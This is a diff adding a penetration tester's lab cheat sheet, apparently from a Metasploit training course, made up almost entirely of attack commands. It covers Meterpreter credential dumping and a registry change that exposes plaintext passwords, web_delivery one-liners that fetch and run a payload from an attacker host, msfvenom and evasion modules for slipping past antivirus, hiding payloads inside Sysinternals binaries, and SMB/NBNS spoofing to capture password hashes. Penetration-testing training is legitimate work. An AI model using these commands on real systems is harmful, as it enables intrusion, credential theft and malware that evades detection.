@@ -1,0 +1,264 @@
+25-Apr-2024 08:00 -- 
+
+
+{{{ 1.2 Meterpreter, SMB, psexec (ADD REG KEY -> CREDSUMP) ================================================================
+
+// meterp lab
+load kiwi 
+sysinfo
+creds_all
+migrate -N spoolsv.exe \\ explorer.exe = best for users 
+
+It runs by default, so you can usually depend on it running
+It always runs with the system's native architecture (it's a 64-bit executable on 64-bit systems, otherwise it's 32-bit)
+It runs as SYSTEM, so we won't lose any privileges by migrating into it
+It's not important on most systems - briefly interfering with the ability to print on one host doesn't usually affect most companies
+
+ps -A x64 -s
+creds_all
+info post/multi/gather/filezilla_client_cred
+sessions -i 1
+run post/multi/gather/filezilla_client_cred
+
+\\ mod hive so creds_all can view PLAINTEXT CREDS 
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+reg setval -k 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -t REG_DWORD -v UseLogonCredential -d 1
+shutdown /r /t 0
+
+
+===================================================================}}}
+
+{{{ 1.3 Client-Side Attacks (Host web server) ================================================================
+
+    // make stageless payload 
+    use payload/windows/x64/meterpreter_reverse_https
+        set LHOST 10.10.10.10
+        generate -f exe -o /share/meterpreter_reverse_https.exe
+        use exploit/multi/handler
+        set payload windows/x64/meterpreter_reverse_https
+        set LHOST 10.10.10.10
+        set LPORT 8443
+        set ExitOnSession false
+        exploit -j -z
+
+        // !!! web_delivery python one-liner
+        set target 0
+        set LHOST 10.10.10.10
+        exploit -j -z
+
+        [*] Started reverse TCP handler on 10.10.10.10:4444
+        msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://10.10.10.10:8080/t6jxyNwMo2uAhsA
+            [*] Server started.
+            [*] Run the following command on the target machine:
+                python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://10.10.10.10:8080/t6jxyNwMo2uAhsA', context=ssl._create_unverified_context());exec(r.read());"
+
+
+                    // web_delivery powershell one-liner
+                    msf6 exploit(multi/script/web_delivery) > show targets
+                    set target 2
+                    set payload windows/x64/meterpreter/reverse_https
+                    exploit -j -z
+
+                    [*] Server started.
+                    [*] Run the following command on the target machine:
+                        powershell.exe -nop -w hidden -c $u=new-object net.webclient;$u.proxy=[Net.WebRequest]::GetSystemWebProxy();$u.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $u.downloadstring('http://10.10.10.10:8080/jMLQVt');
+
+
+
+    ===================================================================}}}
+
+{{{ 1.4 AV Evasion ================================================================
+
+{{{  msfvenom encoding================================================================
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/meterpreter/reverse_tcp \
+  -o /share/meterpreter32_reverse_tcp.exe
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/x64/meterpreter/reverse_https \
+  -o /share/meterpreter64_reverse_https.exe
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/meterpreter/reverse_tcp \
+  -x /share/Sysinternals_Suite/Contig.exe -k -o /share/meterpreter64_sysinternals.exe
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/meterpreter/reverse_tcp \
+  --encrypt rc4 --encrypt-key literallyanystring -o /share/meterpreter32_rc4.exe
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/x64/meterpreter/reverse_tcp \
+  --encrypt rc4 --encrypt-key literallyanystring -o /share/meterpreter64_rc4.exe
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/meterpreter/reverse_tcp \
+  -e x86/shikata_ga_nai -i $(($RANDOM % 7 + 3)) -o /share/meterpreter32_encoded_reverse_tcp.exe
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/x64/meterpreter/reverse_https \
+  -e x64/zutto_dekiru -i $(($RANDOM % 7 + 3)) -o /share/meterpreter64_encoded_reverse_https.exe
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/meterpreter/reverse_tcp \
+  -e x64/zutto_dekiru -i $(($RANDOM % 7 + 3)) -x /share/Sysinternals_Suite/Contig.exe -k -o /share/meterpreter64_encoded_sysinternals.exe
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/meterpreter/reverse_tcp \
+  -e x86/shikata_ga_nai -i $(($RANDOM % 7 + 3)) --encrypt rc4 --encrypt-key literallyanystring -o /share/meterpreter32_encoded_rc4.exe
+
+msfvenom LHOST=10.10.10.10 LPORT=4444 -f exe -p windows/x64/meterpreter/reverse_tcp \
+  -e x64/zutto_dekiru -i $(($RANDOM % 7 + 3)) --encrypt rc4 --encrypt-key literallyanystring -o /share/meterpreter64_encoded_rc4.exe
+
+
+msfconsole -x 'use evasion/windows/syscall_inject; 
+set payload windows/x64/meterpreter_reverse_https;
+set LHOST 10.10.10.10;
+set LPORT 443;
+set FILENAME evasion_syscall_inject.exe;
+run;
+exit'
+
+msfconsole -x 'use evasion/windows/process_herpaderping; 
+set payload windows/x64/meterpreter/reverse_https;
+set LHOST 10.10.10.10;
+set LPORT 443;
+set FILENAME evasion_process_herpaderping.exe;
+run;
+exit'
+
+msfconsole -x 'use evasion/windows/windows_defender_js_hta; 
+set payload windows/x64/meterpreter/reverse_https;
+set LHOST 10.10.10.10;
+set LPORT 443;
+set FILENAME evasion_js.hta;
+run;
+exit'
+
+mv /root/.msf4/local/*.exe /share/
+mv /root/.msf4/local/*.hta /share/
+
+===================================================================}}}
+
+{{{ UNICORN  AV subterfuge powershell command injection ================================================================
+ // + certutil.exe??
+written by Dave Kennedy of TrustedSec, is a fantastic and flexible tool for running payloads on Windows systems without being flagged by antivirus
+
+\\ attack types 
+PowerShell
+Office Macros
+HTML Applications
+Using certutil.exe to evade IDS systems
+Abusing the infamous DDEAUTO functionality in Office
+
+cd /pentest/post-exploitation/unicorn/
+python unicorn.py // view options 
+python unicorn.py windows/meterpreter/reverse_tcp 10.10.10.10 4444
+        - outputs pastable.txt for command injection
+        - use unicorn.rc for handler 
+        - 
+
+cat powershell_attack.txt ; echo
+- pasteable // or 
+msfconsole -r unicorn.rc
+
+===================================================================}}}
+
+{{{ shellter - mask payload in a template .exe! ================================================================
+
+// view types
+C:\> shellter --examples
+
+// hide in ZoomIt.exe from sysinternals
+C:\> copy /Y C:\bin\ZoomIt.exe C:\bin\ZoomIt-shelltered.exe
+C:\> shellter
+
+PE Target: C:\bin\ZoomIt-shelltered.exe
+- set payload/lhost 
+
+msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 58014; set ExitOnSession false; exploit -j -z'
+
+
+Use shellter.exe to embed a web_delivery PowerShell one-liner (from Metasploit, as done in Lab 1.3) into an existing binary. Examine the process hierarchy using Process Explorer (C:\bin\procexp.exe).
+
+Use shellter.exe to embed a basic Shell_Bind_TCP payload into an existing binary. Connect directly from the Linux virtual machine using netcat (/bin/nc).
+
+
+===================================================================}}}
+
+
+https://haiderm.com/undetectable-backdooring-pe-file/
+
+===================================================================}}}
+
+{{{ 1.5 CREDENTIAL PHISHING - SMB Capture & Powershell Integration  ================================================================
+
+// observe NBNS (network bios nameservice) or LLMNR (link local multicast name res)
+wireshark: nbns or llmnr 
+
+// Capturing Credentials Directly With msfconsole
+use auxiliary/server/capture/smb
+set JOHNPWFILE /tmp/smb-capture.txt
+run 
+
+# victim tries to access share
+dir \\offline\C$
+
+- crack hashes/john or hashcat
+
+
+^^^^^^^^^^^^^^^ \\ NOTE: SMB captures not the best, clients don't often hand out smb creds to ---entire subnets--- ; common exception- automated authenticated vulnerability scans, scanning entire subnets at a time
+
+// Stealing Credentials Via auxiliary Modules
+use auxiliary/spoof/nbns/nbns_respons
+set INTERFACE eth0
+set SPOOFIP 10.10.10.10
+run
+
+# victim accesses share
+dir \\offline\C$
+- crack hashes/john or hashcat 
+
+
+// Invoking Inveigh through meterpreter's load powershell
+use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.20
+msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
+msf6 exploit(windows/smb/psexec) > set SMBPass pwlength>everythingelse
+msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_https
+msf6 exploit(windows/smb/psexec) > set LHOST 10.10.10.10
+msf6 exploit(windows/smb/psexec) > set LPORT 443
+msf6 exploit(windows/smb/psexec) > show options
+run
+
+load powershell
+powershell_import /home/sec580/labfiles/Inveigh.ps1
+powershell_shell
+Get-Help Invoke-Inveigh
+
+powershell_execute "Invoke-Inveigh -FileOutput Y -FileOutputDirectory C:\Windows\Temp -FileUnique Y -SpooferIP 10.10.10.10"
+
+
+# winuser runs net comm
+runas /netonly /user:fake cmd.exe // <- easy way to enter creds into meemory for lab purposes
+
+# conn to nonexistent system 
+dir \\step5\C$
+
+cat /tmp/smb-capture_netntlmv2.txt
+
+
+
+// fox-it!
+https://github.com/fox-it/Invoke-CredentialPhisher
+
+===================================================================}}}
+
+
+######################################################################################################
+
+
+{{{ add msfconsole trix ===============================================
+
+===================================================================}}}
+
+
+{{{ add meterpreter trix ==============================================
+
+load -l \\ view loadable modules
+
+
+===================================================================}}}
+
+
